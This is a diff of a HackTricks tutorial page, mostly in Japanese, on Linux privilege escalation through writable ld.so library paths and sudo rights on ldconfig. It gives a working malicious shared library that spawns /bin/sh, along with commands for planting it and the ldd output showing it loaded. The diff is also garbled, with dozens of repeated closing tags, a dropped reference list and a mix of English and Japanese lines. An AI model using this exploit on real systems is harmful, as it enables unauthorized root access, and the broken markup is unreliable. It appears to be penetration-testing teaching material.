@@ -1,22 +1,31 @@
-# ld.so privesc exploit の例
+# ld.so privesc exploit example
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricks をサポートする他の方法:
-
-* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをチェックする
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
-* **HackTricks** にあなたのハッキングのコツを PR として提出して、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリを共有する。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 ## 環境の準備
 
-以下のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます
+次のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます。
 
 {% tabs %}
 {% tab title="sharedvuln.c" %}
@@ -52,14 +61,14 @@ puts("Hi");
 {% endtab %}
 {% endtabs %}
 
-1. 同じフォルダ内にこれらのファイルを**作成**してください
-2. **ライブラリをコンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+1. **同じフォルダー**にそのファイルを作成します
+2. **ライブラリ**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
 3. `libcustom.so`を`/usr/lib`に**コピー**します: `sudo cp libcustom.so /usr/lib` (root権限)
-4. **実行ファイルをコンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`
+4. **実行可能ファイル**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
-### 環境をチェック
+### 環境を確認する
 
-_libcustom.so_が_/usr/lib_から**ロード**されていることと、バイナリを**実行**できることを確認してください。
+_libcustom.so_ が _/usr/lib_ から**読み込まれている**ことと、バイナリを**実行**できることを確認します。
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -71,14 +80,14 @@ $ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
-## エクスプロイト
+## Exploit
 
-このシナリオでは、**誰かが_/etc/ld.so.conf/_ 内のファイルに脆弱なエントリを作成した**と仮定します。
+このシナリオでは、**誰かが_/etc/ld.so.conf/_内に脆弱なエントリを作成したと仮定します**：
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-脆弱なフォルダは _/home/ubuntu/lib_ です（書き込み可能なアクセス権があります）。\
-**以下のコードをダウンロードしてコンパイル** してください。そのパス内で：
+The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
+**次のコードをそのパス内でダウンロードしてコンパイルします:**
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -93,9 +102,9 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-作成した悪意のある **libcustom ライブラリが誤設定されたパス内にある** ため、**再起動**を待つか、root ユーザーが **`ldconfig`** を実行するのを待つ必要があります（**sudo** としてこのバイナリを実行できる場合や、**suid ビット**が設定されている場合は、自分で実行できます）。
+今、**誤って設定された**パス内に悪意のあるlibcustomライブラリを**作成した**ので、**再起動**を待つか、rootユーザーが**`ldconfig`**を実行するのを待つ必要があります（_このバイナリを**sudo**として実行できる場合、または**suidビット**が設定されている場合は、自分で実行できます_）。
 
-これが行われたら、`sharevuln` 実行ファイルが `libcustom.so` ライブラリをどこからロードしているかを**再確認**してください：
+これが発生したら、**再確認**してください。`sharevuln`実行可能ファイルが`libcustom.so`ライブラリをどこから読み込んでいるかを確認します:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -103,7 +112,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-以下のように、**`/home/ubuntu/lib`からロードしています**。そして、ユーザーが実行すると、シェルが実行されます：
+ご覧のとおり、**`/home/ubuntu/lib`から読み込んでいます**。もしユーザーがこれを実行すると、シェルが実行されます：
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -112,26 +121,26 @@ $ whoami
 ubuntu
 ```
 {% hint style="info" %}
-この例では権限昇格は行っていませんが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで、権限を昇格させることができます。
+この例では特権を昇格させていないことに注意してくださいが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つことで**特権を昇格させることができます。
 {% endhint %}
 
 ### その他の誤設定 - 同じ脆弱性
 
-前の例では、管理者が`/etc/ld.so.conf.d/`内の設定ファイルに**非特権フォルダを設定する**という誤設定を行いました。\
-しかし、`/etc/ld.so.conf.d`内の**設定ファイル**に**書き込み権限**がある場合、`/etc/ld.so.conf.d`フォルダや`/etc/ld.so.conf`ファイルに同じ脆弱性を設定し、それを利用することができます。
+前の例では、管理者が**`/etc/ld.so.conf.d/`内の設定ファイルに非特権フォルダーを設定した**という誤設定を偽装しました。\
+しかし、同じ脆弱性を引き起こす他の誤設定もあります。もしあなたが`/etc/ld.so.conf.d`内のいくつかの**設定ファイル**、`/etc/ld.so.conf.d`フォルダー内、または`/etc/ld.so.conf`ファイル内に**書き込み権限**を持っている場合、同じ脆弱性を設定して悪用することができます。
 
-## Exploit 2
+## エクスプロイト 2
 
-**`ldconfig`に対してsudo権限を持っているとします。**\
-`ldconfig`に**どこからconfファイルを読み込むか**を指示できるので、任意のフォルダを`ldconfig`に読み込ませることを利用できます。\
-では、"/tmp"を読み込むために必要なファイルとフォルダを作成しましょう。
+**`ldconfig`に対してsudo権限を持っていると仮定します**。\
+`ldconfig`に**設定ファイルをどこから読み込むかを指示することができます**。これを利用して`ldconfig`に任意のフォルダーを読み込ませることができます。\
+それでは、"/tmp"を読み込むために必要なファイルとフォルダーを作成しましょう：
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-前の**エクスプロイト**で示されたように、`/tmp`内に**悪意のあるライブラリを作成します**。\
-そして最後に、パスをロードして、バイナリがどこからライブラリをロードしているかを確認しましょう:
+今、**前のエクスプロイト**で示されたように、**`/tmp`内に悪意のあるライブラリを作成します**。\
+最後に、パスをロードして、バイナリがライブラリをどこからロードしているかを確認しましょう：
 ```bash
 ldconfig -f fake.ld.so.conf
 
@@ -141,28 +150,36 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**`ldconfig`に対するsudo権限を持っている場合、同じ脆弱性を悪用できることがわかります。**
+**ご覧のとおり、`ldconfig`に対するsudo権限を持っていると、同じ脆弱性を悪用できます。**
 
 {% hint style="info" %}
-**suidビット**が設定されている`ldconfig`を悪用する信頼性の高い方法は**見つかりませんでした**。次のエラーが表示されます：`/sbin/ldconfig.real: 一時キャッシュファイル /etc/ld.so.cache~ を作成できません: 許可が拒否されました`
-{% endhint %}
-
-## 参考文献
-
-* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
-* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
-* HTBのDab machine
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローになる方法を学ぶ</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-HackTricksをサポートする他の方法：
-
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
